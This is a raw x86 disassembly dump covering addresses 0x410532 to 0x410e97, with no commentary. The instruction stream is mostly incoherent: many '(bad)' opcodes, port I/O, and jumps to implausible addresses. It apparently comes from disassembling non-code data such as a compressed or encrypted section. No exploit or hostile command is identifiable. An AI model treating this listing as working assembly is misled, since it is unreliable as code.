  410532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410533:	add    ah,BYTE PTR [eax]
  410535:	inc    edx
  410536:	pushf  
  410537:	add    bh,BYTE PTR [ecx+edi*2]
  41053a:	cld    
  41053b:	and    DWORD PTR [edi+ebp*2+0x0],0x0
	...
  410553:	dec    esi
  410554:	add    al,BYTE PTR [ebx-0x47]
  410557:	fldln2 
  410559:	loopne 0x4105b6
  41055b:	xchg   edx,eax
  41055c:	ret    0x6cc5
  41055f:	pop    ds
  410560:	mov    esi,0xfa3b6cbc
  410565:	inc    DWORD PTR [eax-0x1c]
  410568:	mov    edi,0x2e43e940
  41056d:	jo     0x41053f
  41056f:	in     eax,0x67
  410571:	out    0x95,al
  410573:	adc    DWORD PTR [ecx-0x2],ebp
  410576:	xchg   esi,eax
  410577:	xchg   ecx,eax
  410578:	jmp    DWORD PTR [edi+0x28]
  41057b:	push   ebx
  41057c:	ret    0x10ff
  41057f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410580:	add    al,BYTE PTR [eax]
  410582:	imul   ebx,esp,0xb76fc61
  410588:	imul   esi,DWORD PTR [ebp+ebp*2+0x3],0x555107ef
  410590:	daa    
  410591:	call   FWORD PTR [esi-0x63]
  410594:	inc    ecx
  410595:	add    ebp,ecx
  410597:	jno    0x410615
  410599:	jmp    0x410605
  41059b:	call   0x6f2a6f0b
  4105a0:	mov    ebx,0x5f3cb4fe
  4105a5:	hlt    
  4105a6:	test   bl,0x68
  4105a9:	mov    BYTE PTR [eax+eax*8-0x34170021],ah
  4105b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105b1:	sbb    DWORD PTR [si-0x3e],0x80ff
	...
  4105c9:	add    BYTE PTR [eax],al
  4105cb:	add    BYTE PTR [edi-0x41],al
  4105ce:	inc    eax
  4105cf:	jmp    0x1148f457
  4105d4:	cmp    eax,esp
  4105d6:	(bad)  
  4105d7:	dec    BYTE PTR [esi+ebp*8-0x10d0905]
  4105de:	out    0xd7,eax
  4105e0:	in     al,0x67
  4105e2:	(bad)  
  4105e3:	mov    al,0x61
  4105e5:	add    eax,DWORD PTR [eax]
  4105e7:	xor    al,0x60
  4105e9:	pop    ebx
  4105ea:	sub    BYTE PTR [ebp-0x31018f8d],0x4e
  4105f1:	mov    esi,0xdbae00fb
  4105f6:	jae    0x410604
  4105f8:	add    DWORD PTR [ecx+0x6],esi
  4105fb:	call   0x411812
  410600:	(bad)
  410603:	test   DWORD PTR [ebx+0x49fffffc],ebp
  410609:	inc    esp
  41060a:	test   BYTE PTR [eax],0x8e
  41060d:	add    al,BYTE PTR [eax]
  41060f:	(bad)  
  410610:	retf   
  410611:	repnz std 
  410613:	pop    es
  410614:	jle    0x410618
  410616:	push   0x0
  410618:	xchg   esp,eax
  410619:	(bad)  
  41061a:	imul   eax,DWORD PTR [eax],0x458cfea4
  410620:	cli    
  410621:	dec    esi
  410622:	mov    eax,DWORD PTR [ebp-0x20e36]
  410628:	push   ds
  410629:	fnstenv [ebx-0x8]
  41062c:	icebp  
  41062d:	jae    0x410629
  41062f:	call   0x410634
	...
  410644:	add    al,dl
  410646:	adc    al,BYTE PTR [eax]
  410648:	add    BYTE PTR [ebp-0x3e],dl
  41064b:	jb     0x410652
  41064d:	xlat   BYTE PTR ds:[ebx]
  41064e:	mov    dh,0xff
  410650:	dec    DWORD PTR [esi+0x4a]
  410653:	fild   QWORD PTR [eax]
  410655:	inc    DWORD PTR [ecx]
  410657:	push   DWORD PTR [ebp+0x32]
  41065a:	retf   0x45cf
  41065d:	rcr    ecx,0x4e
  410660:	mov    ebx,esi
  410662:	jmp    0x4105e7
  410664:	hlt    
  410665:	mov    ecx,0x2c50fdd9
  41066a:	retf   0x45bf
  41066d:	add    ecx,ebx
  41066f:	xchg   DWORD PTR [ebp-0x20e6a],eax
  410675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410676:	adc    DWORD PTR [edx-0x1],eax
  410679:	add    DWORD PTR [eax-0x2],ecx
  41067c:	addr16 adc al,0xaa
  41067f:	aas    
  410680:	add    BYTE PTR [edi-0x272850b4],ah
  410686:	xor    al,0x69
  410688:	(bad)  
  410689:	push   edx
  41068a:	jae    0x4106e6
  41068c:	sbb    DWORD PTR [edx-0x5c],ebp
  41068f:	imul   ecx,DWORD PTR [eax-0x18e53de],0x6803c1b0
  410699:	(bad)  
  41069a:	xor    eax,ebp
  41069c:	jmp    DWORD PTR [ecx-0x6709b532]
  4106a2:	mov    WORD PTR [ecx+0x74],gs
  4106a5:	lahf   
  4106a6:	sub    DWORD PTR [ecx+0x43],0x0
	...
  4106be:	mov    BYTE PTR [ebx+edi*2-0x7c],bh
  4106c2:	xchg   ebx,eax
  4106c3:	in     al,dx
  4106c4:	imul   edi,esi,0xf5da5c0d
  4106ca:	fistp  WORD PTR [edx]
  4106cc:	add    al,0xff
  4106ce:	xor    al,bl
  4106d0:	jno    0x4106d0
  4106d2:	pusha  
  4106d3:	(bad)  
  4106d4:	out    dx,eax
  4106d5:	pop    es
  4106d6:	dec    edi
  4106d7:	mov    bh,0xbe
  4106d9:	(bad)  
  4106da:	push   eax
  4106db:	loop   0x41075c
  4106dd:	out    0x50,eax
  4106df:	mov    esp,0x72a8c69
  4106e4:	jb     0x4106e4
  4106e6:	cmp    BYTE PTR [ebx-0x6521f126],cl
  4106ec:	add    bh,bh
  4106ee:	bnd ret 0xfe71
  4106f2:	and    BYTE PTR [eax+esi*8],al
  4106f5:	pop    es
  4106f6:	movhps QWORD PTR [edi+0x7fe210fe],xmm7
  4106fd:	jecxz  0x41070f
  4106ff:	cld    
  410700:	imul   ebp,DWORD PTR [ecx-0x59],0x66491e93
  410707:	pop    ebx
  410708:	imul   esi,DWORD PTR [edi+ecx*8-0x17019795],0xc8fc5c01
  410713:	call   0x646b:0x7ad96924
  41071a:	fldenv [ebp+ecx*8+0x77]
  41071e:	and    edx,DWORD PTR [edx-0x43]
  410721:	imul   eax,DWORD PTR [eax],0x0
	...
  410737:	rcl    ecx,0x50
  41073a:	sub    BYTE PTR [esi-0x3d],ch
  41073d:	call   0xb58b02aa
  410742:	imul   ebp,DWORD PTR [ecx-0x7703e49c],0x9969247a
  41074c:	jp     0x4107b9
  41074e:	push   eax
  41074f:	cdq    
  410750:	lea    eax,fs:[ebp+0x697d734b]
  410757:	add    DWORD PTR [ebx],0xa625dcf5
  41075d:	test   BYTE PTR [ecx+0x71],dh
  410760:	fs call 0xa3c10e55
  410766:	pop    esp
  410767:	pop    ecx
  410768:	fs pop ebp
  41076a:	add    al,0xd3
  41076c:	leave  
  41076d:	rol    BYTE PTR [ebx],0xa7
  410770:	push   ebx
  410771:	mov    gs,WORD PTR [ecx-0x2d]
  410774:	adc    dl,BYTE PTR [ecx+0x38]
  410777:	and    DWORD PTR [ebx+0x3d],0x69
  41077b:	repz jb 0x4107bb
  41077e:	imul   esi,DWORD PTR [ecx],0x3f13b364
  410784:	and    esp,edi
  410786:	push   0x58536421
  41078b:	adc    DWORD PTR [ebp+edx*1+0x69],esp
  41078f:	fwait
  410790:	adc    al,BYTE PTR [ecx]
  410792:	push   ss
  410793:	leave  
  410794:	arpl   WORD PTR ds:0xf55b3b69,ax
  41079a:	push   0x0
	...
  4107af:	add    cl,bh
  4107b1:	arpl   di,di
  4107b3:	jnp    0x410749
  4107b5:	pop    edx
  4107b6:	add    ebp,DWORD PTR [edi-0x63019b81]
  4107bc:	push   0x4fdefe6c
  4107c1:	scas   al,BYTE PTR es:[edi]
  4107c2:	jecxz  0x4107a2
  4107c4:	aas    
  4107c5:	fs (bad) 
  4107c7:	push   esp
  4107c8:	mov    bl,0x5a
  4107ca:	ret    
  4107cb:	add    al,0x4e
  4107cd:	fs (bad) 
  4107cf:	je     0x410815
  4107d1:	ins    BYTE PTR es:[edi],dx
  4107d2:	(bad)  
  4107d3:	mov    dh,0x3f
  4107d5:	out    dx,al
  4107d6:	xadd   DWORD PTR [edx+0x26],eax
  4107da:	jmp    DWORD PTR [esi-0x693059d5]
  4107e0:	pcmpgtw mm7,mm7
  4107e3:	sbb    al,0xc4
  4107e5:	fiadd  DWORD PTR [eax]
  4107e7:	jmp    0xfd3faddb
  4107ec:	xchg   esp,eax
  4107ed:	pop    edx
  4107ee:	imul   edi,DWORD PTR [edi+ecx*1-0x2bc3019b],0xff6efe6c
  4107f9:	scas   al,BYTE PTR es:[edi]
  4107fa:	rcr    DWORD PTR [esi-0x31],cl
  4107fd:	fs (bad) 
  4107ff:	aam    0xb4
  410801:	pop    edx
  410802:	mov    edx,DWORD PTR [esi+edi*4]
  410805:	fs (bad) 
  410807:	aam    0xb4
  410809:	arpl   WORD PTR [ecx+eiz*1+0x3efe64b7],si
  410810:	dec    ecx
  410811:	sti    
  410812:	out    0x1,eax
	...
  410828:	add    BYTE PTR [ebp-0x6d1019c],bh
  41082e:	dec    edx
  41082f:	mul    BYTE PTR [esi]
  410831:	(bad)  
  410832:	pop    ebx
  410833:	mov    al,0xa9
  410835:	(bad)  
  410836:	fs (bad) 
  410838:	pop    esp
  410839:	xchg   esp,eax
  41083a:	ins    BYTE PTR es:[edi],dx
  41083b:	dec    BYTE PTR [esi]
  41083d:	ins    BYTE PTR es:[edi],dx
  41083e:	popf   
  41083f:	aas    
  410840:	add    BYTE PTR [ecx-0x554a0226],ch
  410846:	repnz std 
  410848:	jmp    DWORD PTR [esi-0x600c18a]
  41084e:	fidiv  DWORD PTR [ebx-0x224fe18]
  410854:	call   0x3e46b7
  410859:	stc    
  41085a:	mov    al,0xe2
  41085c:	neg    ecx
  41085e:	(bad)  
  410860:	test   DWORD PTR [esi+0x33fffddb],ecx
  410866:	fdivrp st(5),st
  410868:	(bad)  
  410869:	stc    
  41086a:	lds    edi,FWORD PTR [eax+0x40]
  41086d:	stc    
  41086e:	(bad)  
  410870:	mov    ch,0x62
  410872:	repnz std 
  410874:	push   DWORD PTR [esi]
  410876:	cmp    bh,BYTE PTR [esi]
  410878:	(bad)  
  410879:	cmp    edx,ebp
  41087b:	inc    ebx
  41087c:	clc    
  41087d:	daa    
  41087e:	in     eax,dx
  41087f:	sti    
  410880:	jmp    FWORD PTR [ecx]
  410882:	jmp    0x10:0xb016fc73
  410889:	jle    0x4108aa
  41088b:	ror    DWORD PTR [eax+eax*1],0x0
	...
  41089f:	add    BYTE PTR [eax],al
  4108a1:	add    BYTE PTR [esi+0x33],bh
  4108a4:	mov    esp,ebp
  4108a6:	int    0xc2
  4108a8:	cli    
  4108a9:	push   0x4e
  4108ab:	cmp    al,0x4b
  4108ad:	push   DWORD PTR [ebx+0x5e]
  4108b0:	out    0x81,al
  4108b2:	fwait
  4108b3:	jmp    0xea5492b5
  4108b8:	std    
  4108b9:	jne    0x4108f1
  4108bb:	lods   al,BYTE PTR ds:[esi]
  4108bd:	dec    eax
  4108be:	inc    DWORD PTR ds:0xfeee35ff
  4108c4:	inc    eax
  4108c5:	add    BYTE PTR [esi-0x46000477],dh
  4108cb:	jmp    0x83e81143
  4108d0:	xchg   esp,eax
  4108d1:	inc    edi
  4108d2:	imul   bx,dx,0x1
  4108d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d7:	imul   eax,DWORD PTR [edx+0x655f2ae7],0xfffffffe
  4108de:	lock fisub WORD PTR [esi-0x2]
  4108e2:	jb     0x410947
  4108e4:	pop    edx
  4108e5:	xchg   ebx,eax
  4108e6:	mov    ds:0xe5c86568,al
  4108eb:	add    dl,BYTE PTR [di+0x1c]
  4108ef:	dec    eax
  4108f0:	add    ebx,0x69cf19cb
  4108f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108f7:	mov    ch,0xb5
  4108f9:	(bad)  
  4108fa:	xor    dl,BYTE PTR [ebx+0x5a]
  4108fd:	xor    eax,0x88659872
  410902:	bound  ebp,QWORD PTR [edi+0x3479]
	...
  410918:	add    BYTE PTR [eax],al
  41091a:	add    BYTE PTR [esi],ch
  41091c:	xor    eax,ebx
  41091e:	jmp    FWORD PTR ds:0xe627773e
  410924:	imul   eax,DWORD PTR [edx-0x3f0858c2],0x67
  41092b:	out    dx,al
  41092c:	adc    al,ch
  41092e:	call   ecx
  410930:	jae    0x41091b
  410932:	adc    DWORD PTR [edi-0xc400695],esp
  410938:	push   eax
  410939:	int3   
  41093a:	out    0x41,eax
  41093c:	xchg   edx,eax
  41093d:	gs (bad) 
  41093f:	div    DWORD PTR [ebx]
  410941:	add    al,BYTE PTR [eax]
  410943:	inc    eax
  410944:	jns    0x410920
  410946:	push   ecx
  410947:	fisubr WORD PTR [edx-0x61bfaffe]
  41094d:	cli    
  41094e:	out    0x17,eax
  410950:	inc    edi
  410951:	gs (bad) 
  410953:	aas    
  410954:	xlat   BYTE PTR ds:[ebx]
  410955:	and    eax,0x3c428ff
  41095a:	inc    esi
  41095b:	daa    
  41095c:	add    ah,bh
  41095e:	add    edx,DWORD PTR [edx-0x2a9859a4]
  410964:	inc    edx
  410965:	dec    edi
  410966:	or     WORD PTR [ecx+0xd],sp
  41096a:	jno    0x4109be
  41096c:	sbb    ch,dh
  41096e:	lock cmp eax,0xf1677361
  410974:	(bad)  
  410975:	loopne 0x4109d2
  410977:	nop
  410978:	pop    ds
  410979:	out    dx,al
  41097a:	gs add eax,0x42af
	...
  410991:	add    BYTE PTR [eax],al
  410993:	add    BYTE PTR [edx+eax*1-0x7b4386cc],ah
  41099a:	lods   al,BYTE PTR ds:[esi]
  41099b:	push   0xb543023e
  4109a0:	rcl    esi,0xf0
  4109a3:	pop    ebx
  4109a4:	(bad)  
  4109a5:	sbb    eax,0xc71f65be
  4109aa:	mov    ah,0xda
  4109ac:	test   al,0xe8
  4109ae:	sub    eax,0x1102e7bb
  4109b3:	(bad)
  4109b6:	call   0xc013e51f
  4109bb:	ret    0x6888
  4109be:	push   0xf16081c2
  4109c3:	inc    ebx
  4109c4:	hlt    
  4109c5:	stc    
  4109c6:	sbb    ah,bl
  4109c8:	jo     0x410a2a
  4109ca:	test   DWORD PTR [esi-0x3ce08d00],esp
  4109d0:	pusha  
  4109d1:	shl    BYTE PTR [ebp-0x11],1
  4109d4:	mov    al,ds:0x51dffd6a
  4109d9:	pusha  
  4109da:	inc    eax
  4109db:	mov    ecx,0xdc4d5f89
  4109e0:	inc    eax
  4109e1:	pusha  
  4109e2:	push   ebp
  4109e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109e4:	shl    BYTE PTR [edx-0x51],0xc2
  4109e8:	xor    al,ch
  4109ea:	jmp    FWORD PTR [ebp-0x14]
  4109ed:	ret    0x2dff
  4109f0:	adc    BYTE PTR [eax],cl
  4109f2:	call   0xfea202ae
  4109f7:	push   ds
	...
  410a0c:	add    BYTE PTR [eax],al
  410a0e:	pop    esp
  410a0f:	(bad)  
  410a10:	pushf  
  410a11:	or     al,0x68
  410a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a14:	int    0x8b
  410a16:	pusha  
  410a17:	enter  0xa72b,0x2
  410a1b:	push   ebp
  410a1c:	jb     0x410a6d
  410a1e:	test   bl,al
  410a20:	cmc    
  410a21:	fidivr DWORD PTR [eax-0x30011697]
  410a27:	(bad)  
  410a28:	pop    esp
  410a29:	(bad)  [edi+0x48]
  410a2c:	sbb    eax,0x2c88604a
  410a31:	aas    
  410a32:	mov    WORD PTR [eax+eiz*2],?
  410a35:	pushf  
  410a36:	sar    edi,0x71
  410a39:	or     DWORD PTR [ebp-0x7d54d7d9],0xc6b8e93e
  410a43:	addr16 dec esi
  410a45:	pop    ebp
  410a46:	ret    0x3dff
  410a49:	sti    
  410a4a:	lea    edx,[eax]
  410a4c:	jmp    0x1e0115f5
  410a51:	mov    ds:0x3c58e7b8,al
  410a56:	pusha  
  410a57:	(bad)  
  410a58:	sbb    DWORD PTR [ebx+0x5f],ebx
  410a5b:	dec    BYTE PTR [esi+0x20a8e74a]
  410a61:	fs pop edi
  410a63:	dec    esi
  410a64:	outs   dx,BYTE PTR ds:[esi]
  410a65:	push   ecx
  410a66:	pop    es
  410a67:	call   0xfea151f6
  410a6c:	push   ecx
  410a6d:	fwait
  410a6e:	sbb    eax,0x56ff
	...
  410a83:	add    BYTE PTR [eax],al
  410a85:	add    bh,ch
  410a87:	add    al,BYTE PTR [esi+0x69]
  410a8a:	mov    al,BYTE PTR [edx]
  410a8c:	jne    0x410a8e
  410a8e:	in     al,0x9d
  410a90:	cli    
  410a91:	xor    edi,DWORD PTR [esi-0x54]
  410a94:	std    
  410a95:	push   DWORD PTR [ecx-0x1a]
  410a98:	lock scas al,BYTE PTR es:[edi]
  410a9a:	push   ss
  410a9b:	pop    esi
  410a9c:	jae    0x410a59
  410a9e:	shl    DWORD PTR [eax-0x6],0xff
  410aa2:	cmp    ebx,DWORD PTR [ebx-0x1a]
  410aa5:	sub    esi,edx
  410aa7:	in     eax,0xfd
  410aa9:	pop    edi
  410aaa:	push   eax
  410aab:	sbb    al,0xc1
  410aad:	add    al,0xe
  410aaf:	push   eax
  410ab0:	mov    esp,ebp
  410ab2:	jge    0x410ad3
  410ab4:	sti    
  410ab5:	push   esi
  410ab6:	or     DWORD PTR [ecx],edi
  410ab8:	(bad)  
  410ab9:	imul   edi,DWORD PTR [edi],0xf60873e6
  410abf:	into   
  410ac0:	cmp    edi,edi
  410ac2:	icebp  
  410ac3:	mov    WORD PTR [ebx-0x4],es
  410ac6:	inc    ebp
  410ac7:	stc    
  410ac8:	mov    BYTE PTR [eax],ch
  410aca:	pop    DWORD PTR [esi]
  410acc:	mov    edi,DWORD PTR ds:0x412e33
  410ad2:	and    eax,DWORD PTR ds:[eax]
  410ad5:	je     0x410b52
  410ad7:	outs   dx,BYTE PTR ds:[esi]
  410ad8:	mov    bl,0x49
  410ada:	iret   
  410adb:	push   es
  410adc:	push   edi
  410add:	call   0x3f6280
  410ae2:	xchg   ebp,eax
  410ae3:	ret    0x1f72
  410ae6:	enter  0x31ee,0x48
	...
  410afe:	add    BYTE PTR [ecx],dh
  410b00:	loop   0x410b50
  410b02:	push   0xbeef028e
  410b07:	xchg   esi,eax
  410b08:	leave  
  410b09:	inc    edi
  410b0a:	inc    ecx
  410b0b:	jle    0x410a9f
  410b0d:	std    
  410b0e:	jne    0x410b56
  410b10:	jmp    0x51e6:0xe1c16323
  410b17:	mov    al,0xe1
  410b19:	std    
  410b1a:	jmp    0x410ac3
  410b1c:	push   0xffffffc8
  410b1e:	jg     0x410aa1
  410b20:	imul   edx,edi,0xfffffff9
  410b23:	loope  0x410aec
  410b25:	push   ss
  410b26:	shr    dh,0x1c
  410b29:	arpl   si,di
  410b2b:	sub    BYTE PTR [edx],bl
  410b2d:	mov    dl,0x37
  410b2f:	test   al,0x96
  410b31:	popf   
  410b32:	(bad)  
  410b33:	xchg   edx,eax
  410b34:	daa    
  410b35:	arpl   WORD PTR [edi+ebx*4-0xd],si
  410b39:	mov    al,0x3a
  410b3b:	or     ch,dh
  410b3d:	ret    0xee5d
  410b40:	sub    DWORD PTR [eax],ecx
  410b42:	add    BYTE PTR [edx-0x30],dl
  410b45:	outs   dx,DWORD PTR ds:[esi]
  410b46:	sub    bl,0x5f
  410b49:	in     al,dx
  410b4a:	(bad)  
  410b4b:	jle    0x410bc6
  410b4d:	popa   
  410b4e:	je     0x410aff
  410b50:	add    edx,ebx
  410b52:	cmp    bl,al
  410b54:	mov    eax,DWORD PTR fs:[ebx+edx*8-0x4d]
  410b59:	xor    eax,0x616b6648
  410b5e:	je     0x410b0f
  410b60:	inc    ebx
  410b61:	rcr    bh,1
	...
  410b77:	add    BYTE PTR [eax-0x4c8b9ebc],bh
  410b7d:	pushf  
  410b7e:	xlat   BYTE PTR ds:[ebx]
  410b7f:	pop    es
  410b80:	mov    edi,0xa0ff1f11
  410b85:	mov    ds:0x1ea70344,al
  410b8a:	(bad)  
  410b8b:	jmp    0x410bb1
  410b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b8e:	pop    esi
  410b8f:	push   esi
  410b90:	jmp    DWORD PTR [edx+0x73a73f3c]
  410b96:	aam    0x0
  410b98:	test   BYTE PTR fs:[ecx+0x44],cl
  410b9c:	jae    0x410c09
  410b9e:	add    al,BYTE PTR [eax]
  410ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba1:	adc    al,0x6d
  410ba3:	dec    eax
  410ba4:	out    0x6b,al
  410ba6:	popa   
  410ba7:	je     0x410b58
  410ba9:	add    dh,BYTE PTR [esi+0x8]
  410bac:	xchg   ecx,eax
  410bad:	leave  
  410bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410baf:	add    eax,ebx
  410bb1:	mov    ds:0x2a70418,eax
  410bb6:	imul   ebx,ebx,0xbbd02a6
  410bbc:	xor    bh,dl
  410bbe:	lock imul edi,DWORD PTR [ebp+0x17],0x36
  410bc3:	bound  ecx,QWORD PTR [edi]
  410bc5:	call   0xcac4:0x6aa703e8
  410bcc:	adc    DWORD PTR [ebp+0x1d],ebx
  410bcf:	fsub   DWORD PTR [eax+0x1c066a]
  410bd5:	pop    ebp
  410bd6:	dec    ecx
  410bd7:	sbb    eax,0xe7e8c36c
	...
  410bf0:	add    cl,dh
  410bf2:	push   ss
  410bf3:	jmp    0x6243b2fb
  410bf8:	inc    edi
  410bf9:	inc    esp
  410bfa:	pop    ebp
  410bfb:	mov    bl,0x3
  410bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bfe:	add    ch,cl
  410c00:	mov    dh,0x60
  410c02:	jmp    0xc241:0x2883d83
  410c09:	ffree  st(1)
  410c0b:	call   0xbcc50c3
  410c10:	add    al,0xa7
  410c12:	add    ch,cl
  410c14:	pusha  
  410c15:	xor    ecx,DWORD PTR [edx]
  410c17:	mov    dh,0xf9
  410c19:	daa    
  410c1a:	sbb    al,0x2
  410c1c:	(bad)  
  410c1d:	fadd   DWORD PTR [edx]
  410c1f:	sbb    eax,0xf85b2401
  410c24:	xlat   BYTE PTR ds:[ebx]
  410c25:	lahf   
  410c26:	inc    ebx
  410c27:	sub    esp,DWORD PTR [eax-0x59]
  410c2a:	add    ch,cl
  410c2c:	add    ecx,DWORD PTR [edx+esi*8-0x3852e87b]
  410c33:	daa    
  410c34:	add    al,0x68
  410c36:	push   ss
  410c37:	add    BYTE PTR [edi-0x7f003c8d],dh
  410c3d:	sbb    dl,BYTE PTR ds:0x402a66ff
  410c43:	pop    ss
  410c44:	push   edx
  410c45:	pop    esi
  410c46:	mov    bh,0x8a
  410c48:	inc    ebp
  410c49:	xor    dh,BYTE PTR [edi+0xc60620b]
  410c4f:	(bad)  
  410c50:	mov    ebx,0x817f8b9c
	...
  410c69:	add    BYTE PTR [ebx-0x6c9fffe],ah
  410c6f:	pop    es
  410c70:	(bad)
  410c74:	(bad)  
  410c75:	jmp    0x6e50de01
  410c7a:	and    edx,DWORD PTR [eax+0x7fa4e8ff]
  410c80:	cmp    al,0xcf
  410c82:	jmp    0x410c46
  410c84:	(bad)  
  410c85:	call   0xb53fff62
  410c8a:	mov    al,bh
  410c8c:	inc    eax
  410c8d:	jmp    0xa27f22d9
  410c92:	in     eax,0x5b
  410c94:	out    0x1,al
  410c96:	scas   al,BYTE PTR es:[edi]
  410c97:	pop    ebx
  410c98:	(bad)  
  410c99:	mov    eax,ds:0xe90002a4
  410c9e:	add    DWORD PTR [edx+0x23],eax
  410ca1:	jmp    0xe9459966
  410ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ca7:	add    al,BYTE PTR [eax]
  410ca9:	push   0x5f
  410cab:	inc    DWORD PTR [edx-0x7af45b0a]
  410cb1:	out    dx,al
  410cb2:	pop    es
  410cb3:	pop    ebp
  410cb4:	(bad)  
  410cb5:	jb     0x410d20
  410cb7:	push   edi
  410cb8:	pop    esi
  410cb9:	mov    al,0xe2
  410cbb:	(bad)  
  410cbc:	(bad)  
  410cbd:	ds xchg ebx,eax
  410cbf:	dec    eax
  410cc0:	fisubr DWORD PTR [ecx]
  410cc2:	mov    ds:0x7f00715a,eax
  410cc7:	(bad)  
  410cc8:	std    
  410cc9:	mov    esi,DWORD PTR [edi]
  410ccb:	test   BYTE PTR cs:[ebx+0x0],0x0
	...
  410ce3:	pop    es
  410ce4:	addr16 jle 0x410c8f
  410ce7:	jl     0x410ce9
  410ce9:	mov    ecx,ecx
  410ceb:	push   0xa6ebc78e
  410cf0:	(bad)  
  410cf1:	mov    DWORD PTR [ebx],0x50c78e90
  410cf7:	(bad)
  410cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cfb:	cmp    bh,bh
  410cfd:	dec    DWORD PTR [edx-0x36766889]
  410d03:	or     eax,0x38c989c5
  410d08:	push   cs
  410d09:	div    BYTE PTR [ebp-0x5e]
  410d0c:	inc    ecx
  410d0d:	rcl    DWORD PTR [ebp-0x6b],0xeb
  410d11:	data16 or BYTE PTR [edx+0x1cf7fe3f],bh
  410d18:	add    bl,al
  410d1a:	push   DWORD PTR [ebp+0x44]
  410d1d:	push   es
  410d1e:	or     edi,DWORD PTR [esi-0x2c14f5cd]
  410d24:	loopne 0x410d2c
  410d26:	inc    dh
  410d28:	ds jle 0x410d63
  410d2b:	mov    esi,0xfcc9f439
  410d30:	or     DWORD PTR [eax],eax
  410d32:	push   ebp
  410d33:	inc    ebp
  410d34:	rol    BYTE PTR [ecx+0x668ed2c4],cl
  410d3a:	xor    BYTE PTR [edx],cl
  410d3c:	inc    esi
  410d3d:	(bad)  
  410d3e:	imul   DWORD PTR [ebp+eax*1-0x3d]
  410d42:	call   DWORD PTR [ecx+0x4c]
  410d45:	repnz add BYTE PTR [eax],al
	...
  410d5c:	mov    es,WORD PTR [esi]
  410d5e:	add    BYTE PTR [ebx],ch
  410d60:	gs je  0x410da6
  410d63:	cld    
  410d64:	into   
  410d65:	mov    ecx,0x83a70873
  410d6a:	js     0x410d79
  410d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d6d:	imul   eax,DWORD PTR [edi+0x5d96efbf],0x74
  410d74:	lahf   
  410d75:	jae    0x410d9f
  410d77:	xor    al,0x60
  410d79:	ror    DWORD PTR [esp+eax*2-0x184bd3a1],1
  410d80:	ret    
  410d81:	pop    ds
  410d82:	pop    edi
  410d83:	(bad)  
  410d84:	push   ds
  410d85:	lahf   
  410d86:	push   esi
  410d87:	(bad)  
  410d88:	mov    edx,0xaa536baf
  410d8d:	imul   eax,DWORD PTR [edx],0xb
  410d90:	addr16 cwde 
  410d92:	idiv   dh
  410d94:	mov    dl,0xc3
  410d96:	pop    esi
  410d97:	je     0x410db4
  410d99:	jl     0x410e05
  410d9b:	xchg   ebx,ebx
  410d9d:	sub    BYTE PTR [edi-0x2],bl
  410da0:	call   0x26b:0x9a416c1f
  410da7:	(bad)  
  410da8:	jp     0x410e0d
  410daa:	push   0xfffffff3
  410dac:	mov    dl,0x8
  410dae:	pop    edi
  410daf:	xor    BYTE PTR [edx+0x57],0x2
  410db3:	je     0x410d3e
  410db5:	jae    0x410d6b
  410db7:	dec    edx
  410db8:	imul   bx,WORD PTR [ebp+0x74],0xffd3
  410dbd:	add    edx,DWORD PTR [ebx+0xd]
	...
  410dd3:	add    BYTE PTR [eax],al
  410dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd6:	imul   ecx,DWORD PTR [ecx],0xffffffc0
  410dd9:	push   ebx
  410dda:	pop    esi
  410ddb:	cdq    
  410ddc:	add    BYTE PTR [edi+0x32ff026b],ah
  410de2:	das    
  410de3:	push   0x5
  410de5:	jae    0x410e27
  410de7:	pop    ebp
  410de8:	mov    ah,ah
  410dea:	and    al,0x4d
  410dec:	shr    DWORD PTR [ebx-0x74754895],0xc3
  410df3:	popf   
  410df4:	(bad)  
  410df6:	add    ch,cl
  410df8:	pop    ebx
  410df9:	push   ss
  410dfa:	add    al,0xaa
  410dfc:	pop    esi
  410dfd:	or     edi,0x10cb6be0
  410e03:	mov    ds,WORD PTR [esi-0x2]
  410e06:	or     dl,BYTE PTR [ecx]
  410e08:	mov    esp,0x5ee8c3c0
  410e0d:	fisttp DWORD PTR [edx]
  410e0f:	sbb    esp,0xe96d5990
  410e15:	test   al,0xea
  410e17:	fild   QWORD PTR [ebx]
  410e19:	out    0x2,al
  410e1b:	pop    esi
  410e1c:	fsubr  DWORD PTR [eax+0x381bc26a]
  410e22:	pop    ecx
  410e23:	dec    ebp
  410e24:	fsubr  DWORD PTR [eax+0x2960346a]
  410e2a:	pop    ecx
  410e2b:	add    BYTE PTR [edi+eiz*4],0x2
  410e2f:	jmp    0xe93ef480
  410e34:	mov    eax,0x4769661d
	...
  410e4d:	add    BYTE PTR [eax],dl
  410e4f:	jmp    0xd111:0x2c040e3
  410e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e57:	inc    ebp
  410e58:	or     eax,0x6067b5e
  410e5d:	fsub   DWORD PTR [eax-0x1fe68796]
  410e63:	pop    eax
  410e64:	sub    eax,0xe902dcc8
  410e69:	add    esp,DWORD PTR [edi+0x585c2b87]
  410e6f:	jmp    0x4ac1:0x267c932
  410e76:	pusha  
  410e77:	pop    ecx
  410e78:	int    0x9
  410e7a:	out    0xcd,eax
  410e7c:	or     dh,BYTE PTR [ebp+eiz*1+0x1bf4c0d7]
  410e83:	icebp  
  410e84:	inc    DWORD PTR [edx-0x6d]
  410e87:	enter  0x34fe,0xb7
  410e8b:	push   0xffffffdb
  410e8d:	loop   0x410e7a
  410e8f:	pop    eax
  410e90:	or     ch,BYTE PTR [ecx+0x2cc7015f]
  410e96:	pop    es
  410e97:	pop    eax
